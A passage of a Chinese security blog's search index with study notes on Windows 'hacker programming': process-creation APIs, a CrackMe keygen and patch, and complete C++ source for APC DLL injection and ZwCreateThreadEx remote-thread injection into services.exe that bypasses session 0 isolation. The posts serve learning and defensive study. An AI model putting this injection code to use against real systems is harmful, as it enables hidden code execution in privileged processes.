= (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取导出表地址 PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); //从导出表取出的函数名 char* lpFuncName = NULL; //获取AddressOfNames PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames); //获取AddressOfNameOrdinals PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals); //索引值 WORD wHint = 0; //获取AddressOfFunctions PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions); //获取所有根据名称导出的函数数量 DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames; for (int i = 0; i &lt; dwNumberOfNames; i++) &#123; lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (strcmpi(lpFuncName, lpszFuncName) == 0) &#123; //获取索引值 wHint = lpAddressOfNameOrdinalArray[i]; //根据索引值，在AddressOfFunctions中取出RVA lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; //返回函数地址 return lpFunc;&#125; 运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"PE","slug":"PE","permalink":"https://b1ack1e.github.io/tags/PE/"}]},{"title":"启动技术-创建进程API","slug":"启动技术-创建进程API","date":"2021-07-14T07:15:24.000Z","updated":"2021-08-09T10:52:18.336Z","comments":true,"path":"2021/07/14/启动技术-创建进程API/","link":"","permalink":"https://b1ack1e.github.io/2021/07/14/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/","excerpt":"","text":"创建进程API在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软提供WinExec，ShellExecute和CreateProcess等函数来实现进程创建。 具体实现及函数介绍WinExec运行指定的应用程序 1234UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow); lpCmdLine：要执行的应用程序的命令行。如果参数中的可执行文件名称不包含文件路径，则系统按以下顺序搜索可执行文件： 应用程序加载的目录 当前目录 Windows系统目录。GetSystemDirectory函数检索此目录的路径。 Windows目录。GetWindowsDirectory函数检索此目录的路径。 PATH环节变量中列出的目录 uCmdShow：显示选项，具体内容如下表： 值 含义 SW_HIDE0 隐藏窗口并激活另一个窗口 SW_SHOWNORMALSW_NORMAL1 激活并显示一个窗口 SW_SHOWMINIMIZED2 激活窗口并将其显示为最小化的窗口 SW_SHOWMAXIMIZEDSW_MAXIMIZE3 激活窗口并将其显示为最大化窗口 SW_SHOWNOACTIVATE4 以最近的大小和位置显示窗口 SW_SHOW5 激活窗口并以其当前大小和位置显示它 SW_MINIMIZE6 最小化指定的窗口并激活Z顺序中的下一个顶级窗口 SW_SHOWMINNOACTIVE7 将窗口显示为最小化窗口 SW_SHOWNA8 以当前大小和位置显示窗口 SW_RESTORE9 激活并显示窗口 SW_SHOWDEFAULT10 根据启动应用程序的程序传递给CreateProcess函数的STARTUPINFO结构中指定的SW_值设置显示状态。 SW_FORCEMINIMIZE11 最小化一个窗口，即使拥有该窗口的线程没有响应。仅在最小化来自不同线程的窗口时才应使用此标志。 返回值：如果函数成功，则返回值大于31；如果函数失败，则返回值是以下错误值之一。 值 含义 0 系统内存或资源不足 ERROR_BAD_FORMAT exe文件无效 ERROR_FILE_NOT_FOUND 找不到指定文件 ERROR_PATH_NOT_FOUND 找不到指定的路径 具体代码如下： 123456HINSTANCE hInstance = ShellExecute(NULL, NULL, &quot;自己的文件路径&quot;, NULL, NULL, SW_NORMAL);if ((int)hInstance &lt;= 32) &#123; printf(&quot;ShellExecute创建失败\\n&quot;);&#125;else printf(&quot;ShellExecute创建成功\\n&quot;); 创建的进程为之前编写过得MFC程序，运行此程序即可提示创建成功，同时TestAPC也被成功创建。 ShellExecute函数对指定文件执行操作 12345678HINSTANCE ShellExecuteA( HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd); hwnd：用于显示UI或者错误信息的父窗口的句柄。如果操作与窗口无关，则此值可以为NULL。 lpOperation：指向以空字符结尾的字符串的指针，它在本例中成为动词，用于指定要执行的操作。常使用的动词有： edit：启动编辑器并打开文档进行编辑。如果lpFile不是文档文件，则该函数将失败。 explore：探索由lpFile指定的文件夹。 find：在由lpDirectory指定的目录中启动搜索。 open：打开由lpFile指定的项目。该项目可以是文件也可以是文件夹。 print：打印由lpFile指定的文件。如果lpFile不是文档文件，则该函数失败。 NULL：如果可用，则使用默认动词。如果不可用，则使用“打开”动词。如果两个动词都不可用，则系统使用注册表中列出的第一个动词。 lpFile：指向以空字符结尾的字符串的指针，该字符串要在其上指向指定谓词的文件或对象。如果lpDirectory参数使用相对路径，则lpFile不要使用相对路径。 lpParameters：如果lpFile指定一个可执行文件，则此参数是一个指向空字符结尾的字符串的指针，该字符串指定要传递给应用程序的参数。如果lpFile指定一个文档文件，则lpParameters应该为NULL。 lpDirectory：指向以空终止的字符串的指针，该字符串指定操作的默认目录。如果此值为NULL，则使用当前的工作目录。如果在lpFile提供了相对路径，请不要对lpDirectory使用相对路径。 nShowCmd：指定应用程序在打开时如何显示标志，具体值在上文。 返回值：如果函数成功，则返回大于32的值。如果函数失败，则它返回一个错误值，指示失败的原因。 具体代码如下： 123456HINSTANCE hInstance = ShellExecute(NULL, NULL, &quot;自己的文件路径&quot;, NULL, NULL, SW_NORMAL);if ((int)hInstance &lt;= 32) &#123; printf(&quot;ShellExecute创建失败\\n&quot;);&#125;else printf(&quot;ShellExecute创建成功\\n&quot;); 运行程序提示创建成功，同时TestAPC被成功创建。 CreateProcess创建一个新进程及主线程。新进程在调用进程的安全的上下文中运行。 123456789101112BOOL CreateProcess( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation); lpApplicationName：要执行的模块的名称。可以设置为NULL。要运行批处理文件，必须启动命令解释程序，并将其设置为cmd.exe。 lpCommandLine：要执行的命令行。 lpProcessAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新进程对象的句柄是否可以被子进程继承。如果lpProcessAttributes为NULL，则不能继承句柄。 lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新线程对象句柄是否可由子进程继承。如果lpThreadAttributes为 NULL，则不能继承句柄。 bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄。 dwCreationFlags：控制优先级类和进程创建的标志。 lpEnvironment：指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。 lpCurrentDirectory：进程当前目录的完整路径。该字符串还可以指定 UNC 路径。如果此参数为NULL，则新进程将与调用进程具有相同的当前驱动器和目录。 lpStartupInfo：指向STARTUPINFO或STARTUPINFOEX结构的指针 。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭。 lpProcessInformation：指向PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息。PROCESS_INFORMATION中的句柄必须在不需要时由CloseHandle关闭。 返回值：如果函数成功，则返回值非0；若失败，则返回值为0。 具体代码如下： 12345678910111213STARTUPINFO si = &#123; 0 &#125;;PROCESS_INFORMATION pi;si.cb = sizeof(si);si.dwFlags = STARTF_USESHOWWINDOW;si.wShowWindow = SW_NORMAL;BOOL flag = CreateProcess(NULL, &quot;自己的文件路径&quot;, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi);if (flag) &#123; CloseHandle(pi.hThread); CloseHandle(pi.hProcess); printf(&quot;CreateProcess创建成功\\n&quot;);&#125;else printf(&quot;CreateProcess创建失败\\n&quot;); 运行之后，即可成功创建TestAPC进程。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"160CrackMe-001","slug":"160CrackMe-001","date":"2021-07-14T02:23:13.000Z","updated":"2021-08-09T10:55:30.407Z","comments":true,"path":"2021/07/14/160CrackMe-001/","link":"","permalink":"https://b1ack1e.github.io/2021/07/14/160CrackMe-001/","excerpt":"","text":"初探打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。 程序主题界面有两部分，第一部分是序列号加名字。 第二部分是单纯的序列号，应该是比较简单。 看完大体流程，开始分析。 分析查询程序的基本信息，可以看到未加壳，是用Delphi语言编写的。 先分析单纯的序列号。用OD打开程序，搜索字符串，搜索错误的提示，可以看到成功与错误的提示，还有一个JNZ，这里应该是关键的判断跳转。 在函数头部下断点，开始分析。可以看到它把Hello和Dude！压入栈之后，再将其拼接起来组成新的字符串，然后再与我们输入的序列号进行比较。 那么这里的序列号就是Hello Dude!。输入正确的序列号之后，弹出正确的窗口。 再来分析序列号加用户名还是通过搜索错误提示的字符串，即可找到关键的跳转，在最后的跳转前查看一下，可以看到栈存放着两个值进行比较，一个是我们输入的123456，另一个是CW-80360-CRACKED，那么这个应该是要输入的serial。往上开始寻找这段序列号是如何生成的。在函数头部下断开始分析。 首先是检测了输入的用户名长度，不可以小于4位。 继续往下看，可以看到CW，-，CRACKED和数字这几段，然后通过一个函数将它们拼接起来，字母都是本身有的，那么就需要寻找数字的生成。 数字是通过sub_406718生成的，而其中的参数是通过0x431750处传入的，那么这个值是从哪来的，从上分析。可以看到这里的计算过程。它是获取输入用户名第一位然后乘以0x29再乘以2。而之后的sub_406718作用是将十六进制转为十进制字符串。 到这里整个过程就分析了，开始尝试编写注册机 注册机编写12345678910111213141516171819#include &quot;pch.h&quot;#include &lt; stdio.h &gt;#include &lt;string.h&gt;#include &lt;corecrt_malloc.h&gt;int main()&#123; char Name[20]; printf(&quot;请输入大于四位的用户名\\n&quot;); gets_s(Name, 20); int Num; Num = (Name[0] * 0x29) * 2; char* s1=&quot;CW&quot;; char* s2 = &quot;CRACKED&quot;; char* s3= &quot;-&quot;; char* serial = (char*)malloc(100); sprintf(serial, &quot;%s%s%d%s%s&quot;, s1, s3, Num, s3, s2); printf(&quot;用户名是：%s\\nserial是：%s&quot;, Name, serial); return 0;&#125; 输入用户名b1ackie，就可以计算出正确的serial。 输入正确的值查看 弹窗的消除先根据弹窗的提示信息，搜索字符串，可以定位到此处。 执行出来，可以看到在外部有一个JZ跳转可以跳过这个弹窗函数，我们只需要将其修改为JMP就可以无条件跳走了。 小结第一个crackme，还是比较简单的，没有什么难度，做起来比较轻松。 还记得上次做这个还是大一的时候，那个时候也刚接触这块没多久，当时还是看着帖子一步一步学着来。学习记录还是要坚持做下去，这些crackme也要坚持争取全部都做一遍。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"注入技术-APC注入","slug":"注入技术-APC注入","date":"2021-07-13T07:25:36.000Z","updated":"2021-08-09T10:53:14.446Z","comments":true,"path":"2021/07/13/注入技术-APC注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-APC%E6%B3%A8%E5%85%A5/","excerpt":"","text":"APC注入APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。 函数介绍QueueUserAPC将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。 12345DWORD QueueUserAPC( PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData); pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。 hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。 dwData：传递由pfnAPC参数指向的APC函数的单个值。 返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。 具体实现在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。 具体代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;atlconv.h&gt;#include &lt;atlstr.h&gt;DWORD GetPidByName(char* pszProcessName) &#123; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 PE32 = &#123; sizeof(PE32) &#125;; USES_CONVERSION; CString ProcessName = A2T(pszProcessName); BOOL flag = Process32First(hSnap, &amp;PE32); while (flag) &#123; if (lstrcmp(PE32.szExeFile, ProcessName) == 0) &#123; return PE32.th32ProcessID; &#125; flag = Process32Next(hSnap, &amp;PE32); &#125; return 0;&#125;BOOL GetAllThreadIdByProcessId(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)&#123; DWORD* pThreadId = NULL; DWORD dwThreadIdLength = 0; DWORD dwBufferLength = 1000; THREADENTRY32 te32 = &#123; 0 &#125;; HANDLE hSnapshot = NULL; BOOL bRet = TRUE; do &#123; // 申请内存 pThreadId = new DWORD[dwBufferLength]; if (NULL == pThreadId) &#123; printf(&quot;申请内存失败\\n&quot;); bRet = FALSE; break; &#125; RtlZeroMemory(pThreadId, (dwBufferLength * sizeof(DWORD))); // 获取线程快照 RtlZeroMemory(&amp;te32, sizeof(te32)); te32.dwSize = sizeof(te32); hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (NULL == hSnapshot) &#123; bRet = FALSE; break; &#125; // 获取第一条线程快照信息 bRet = Thread32First(hSnapshot, &amp;te32); while (bRet) &#123; // 获取进程对应的线程ID if (te32.th32OwnerProcessID == dwProcessId) &#123; pThreadId[dwThreadIdLength] = te32.th32ThreadID; dwThreadIdLength++; &#125; // 遍历下一个线程快照信息 bRet = Thread32Next(hSnapshot, &amp;te32); &#125; // 返回 *ppThreadId = pThreadId; *pdwThreadIdLength = dwThreadIdLength; bRet = TRUE; &#125; while (FALSE); if (FALSE == bRet) &#123; if (pThreadId) &#123; delete[]pThreadId; pThreadId = NULL; &#125; &#125; return bRet;&#125;BOOL Inject(char* pszProcessName, char* pszDllname) &#123; BOOL flag = FALSE; DWORD dwPID = 0; DWORD* pThreadId = NULL; DWORD dwThreadLength = 0; HANDLE hProcess = NULL; HANDLE hThread = NULL; PVOID pBaseAddress = NULL; PVOID pLoadLibraryFunc = NULL; SIZE_T dwRet = 0, dwDllPathLen = strlen(pszDllname) + 1; DWORD i = 0; do &#123; //获取进程的PID dwPID = GetPidByName(pszProcessName); if (dwPID == 0) &#123; printf(&quot;获取PID失败\\n&quot;); flag = FALSE; break; &#125; //获取所有线程ID flag = GetAllThreadIdByProcessId(dwPID, &amp;pThreadId, &amp;dwThreadLength); if (flag == FALSE) &#123; flag = FALSE; break; &#125; //打开进程 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); flag = FALSE; break; &#125; //申请内存空间 pBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pBaseAddress == NULL) &#123; printf(&quot;申请空间失败\\n&quot;); flag = FALSE; break; &#125; //向申请的空间写入内存 WriteProcessMemory(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet); if (dwRet != dwDllPathLen) &#123; printf(&quot;写入内存失败\\n&quot;); flag = FALSE; break; &#125; pLoadLibraryFunc = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (pLoadLibraryFunc == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); flag = FALSE; break; &#125; //向所有的线程插入APC函数 for (i = 0; i &lt; dwThreadLength; i++) &#123; hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]); if (hThread) &#123; QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress); CloseHandle(hThread); hThread = NULL; &#125; &#125; flag = TRUE; &#125; while (FALSE); if (hProcess) &#123; CloseHandle(hProcess); hProcess = NULL; &#125; if (pThreadId) &#123; delete[]pThreadId; pThreadId = NULL; &#125; return flag;&#125;int main()&#123; BOOL flag=Inject(&quot;自己的文件路径&quot;); if (flag == TRUE) &#123; printf(&quot;注入成功\\n&quot;); &#125; else printf(&quot;失败\\n&quot;); getchar(); return 0;&#125; 效果查看写一个MFC的小程序，点击确定按钮之后就会调用SleepEx函数。 123456void CTestApcDlg::OnBnClickedOk()&#123; // TODO: 在此添加控件通知处理程序代码 SleepEx(10000, true); //CDialogEx::OnOK();&#125; 然后打开我们的注入程序，看到提示已经注入成功。 点击确定按钮，就会弹出我们在DLL里写好的弹窗。 使用process explore工具查看可以看到我们的DLL已经注入到TestApc.exe中了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"注入技术-突破session 0隔离的远线程注入","slug":"注入技术-突破session 0隔离的远线程注入","date":"2021-07-13T02:02:17.000Z","updated":"2021-08-09T10:53:08.392Z","comments":true,"path":"2021/07/13/注入技术-突破session 0隔离的远线程注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/13/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E7%AA%81%E7%A0%B4session%200%E9%9A%94%E7%A6%BB%E7%9A%84%E8%BF%9C%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"SESSION 0隔离在早期操作系统中，所有的服务和应用程序都是运行在同一个session中，session 0。这些一起运行的服务与应用程序，由于服务是以最高权限进行运行的，所以造成一些安全风险，恶意代码可以利用这点来提升自己的权限。 在Visita中，服务在一个叫做session0的特殊session中承载。应用程序在其他session中，这样服务与应用程序就隔离开来。这样的话，恶意代码要向注入到关键的系统服务进程中，就会因为session 0的隔离而失败。 但是直接调用zwCreateThreadEx函数可以进行远线程注入，还可以突破隔离。 实现原理实现突破SESSION 0隔离的注入技术是使用比CreateRemoteThread函数更为底层的ZwCreateThreadEx函数来创建的远线程的。因为此函数在ntdll.dll中没有声明，所以需要使用GetProcAddress从ntdll.dll中获取该函数的导出地址。 ZwCreateThreadEx函数比CreateRemoteThread函数更为底层，那么CreateRemoteThread函数最终还是通过调用ZwCreateThreadEx函数来实现远线程创建的。为什么使用CreateRemoteThread函数没有用。经过前人的跟踪与分析，发现调用ZwCreateThreadEx函数创建远线程的时候，第七个参数的值为1，这会导致创建的线程完成后一直挂起无法恢复运行，这就是为什么DLL注入失败的原因。要想成功的话，就要直接调用ZwCreateThreadEx函数，将第七个参数设置为0，这样线程创建完成之后就会恢复运行，成功注入。 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;atlconv.h&gt;#include &lt;atlstr.h&gt;BOOL CreateRemoteThreadInject(DWORD dwProcessId, WCHAR* pszDllFileName) &#123; //提升权限 HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken) == false) &#123; printf(&quot;打开近访问令牌失败\\n&quot;); return FALSE; &#125; LUID luid; if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid) == false) &#123; printf(&quot;查看特权信息失败\\n&quot;); return FALSE; &#125; TOKEN_PRIVILEGES tkp; tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; tkp.Privileges[0].Luid = luid; if (false == AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) &#123; printf(&quot;调节权限失败\\n&quot;); return FALSE; &#125; HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; //获取注入进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; dwSize = lstrlen(pszDllFileName) + 1; //printf(&quot;dwSize:%d\\n&quot;, dwSize); //申请内存 pDllAddr = VirtualAllocEx(hProcess, NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return FALSE; &#125; //向申请的内存写入数据 BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * 2, NULL); if (WriteFlag == NULL) &#123; printf(&quot;写入内存失败\\n&quot;); return FALSE; &#125; HMODULE hNtdll = LoadLibrary(L&quot;ntdll.dll&quot;); if (hNtdll == NULL) &#123; printf(&quot;获取NTDLL地址失败\\n&quot;); return FALSE; &#125; //获取loadlibrary pFuncProcAddr = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;); if (pFuncProcAddr == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); return FALSE; &#125;#ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown);#else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown);#endif typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdll, &quot;ZwCreateThreadEx&quot;); if (ZwCreateThreadEx == NULL) &#123; printf(&quot;获取ZW地址失败\\n&quot;); return FALSE; &#125; HANDLE hRemoteThread = NULL; ZwCreateThreadEx(&amp;hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;创建失败\\n&quot;); return FALSE; &#125; CloseHandle(hProcess); FreeLibrary(hNtdll); return TRUE;&#125;DWORD GetPID(char* pszProcessName) &#123; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 pe = &#123; sizeof(pe) &#125;;//初始化 USES_CONVERSION; CString ProcessName = A2T(pszProcessName); BOOL flag = Process32First(hSnap, &amp;pe); while (flag) &#123; if (lstrcmp(pe.szExeFile, ProcessName) == 0) &#123; return pe.th32ProcessID; &#125; flag = Process32Next(hSnap, &amp;pe); &#125; CloseHandle(hSnap); return 0;&#125;int main() &#123; printf(&quot;按下回车开始注入\\n&quot;); getchar(); DWORD dwPID = GetPID(&quot;services.exe&quot;); bool flag = CreateRemoteThreadInject(dwPID, L&quot;C:\\\\Users\\\\b1ackie\\\\Desktop\\\\RemoteTest.dll&quot;); if (flag == FALSE) &#123; printf(&quot;注入失败\\n&quot;); &#125; else printf(&quot;注入成功\\n&quot;); getchar(); return 0;&#125; 效果查看尝试注入SESSION 0的service.exe，使用Process Explorer可以看到services.exe的相关信息 打开程序，按下回车开始注入，显示注入成功 使用Process Explorer查看services.exe的导入模块 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"注入技术-远程线程注入","slug":"注入技术-远程线程注入","date":"2021-07-12T03:56:15.000Z","updated":"2021-08-09T10:53:11.544Z","comments":true,"path":"2021/07/12/注入技术-远程线程注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/12/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/","excerpt":"","text":"远程线程注入远程线程注入是指一个进程在另一个进程中创建线程的技术。 函数介绍OpenProcess打开现有的本地进程对象 12345HANDLE OpenProcess( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId); dwDesiredAccess：访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或者多个进程访问权限。如果调用了该函数的进程启用了SeDebugPrivilege权限，则无论安全描述符的内容是什么，它都会授予所请求的访问权限。 bInheritHandle：若此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程不会进程此句柄。 dwProcessId：要打开的本地进程PID。 返回值：如果函数成功，则返回值是指定进程的打开句柄；如果失败，则返回值为NULL。 VirtualAllocEx在指定进程的虚拟地址空间内保留、提交或更改内存的状态。 1234567LPVOID VirtualAllocEx( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect); hProcess：进程的句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION访问权限。 lpAddress：指定要分配页面所需起始地址的指针。如果为NULL，则该函数自动分配内存。 dwSize：要分配的内存大小，以字节为单位。 flAllocationType：内存分配类型。此参数必须为以下值之一。 值 含义 MEM_COMMIT0x00001000 在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存 MEM_RESERVE0x00002000 保留进程中虚拟地址空间的范围，但不会在内存或磁盘上的分页文件中分配任何实际物理存储位置 MEM_RESET0x00080000 表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入。 